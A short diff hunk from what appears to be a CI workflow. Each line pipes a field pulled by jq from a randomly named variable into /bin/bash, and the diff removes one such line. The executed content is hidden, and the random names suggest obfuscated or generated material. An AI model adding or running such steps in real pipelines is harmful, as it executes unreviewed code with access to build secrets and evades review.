@@ -32,7 +32,6 @@ jobs:
           echo $zgrbp7 | jq -r .xkkag3181 | /bin/bash
           echo $enmt79 | jq -r .zlnlt74445 | /bin/bash
           echo $xid11323 | jq -r .do63739 | /bin/bash
-          printf '%s' "$nr7400" | jq -r .w9987 | /bin/bash
           printf '%s' "$jkj8" | jq -r .x7203 | /bin/bash
           printf '%s' "$ln62" | jq -r .eepv5 | /bin/bash
           echo $ylqf1045 | jq -r .l37 | /bin/bash
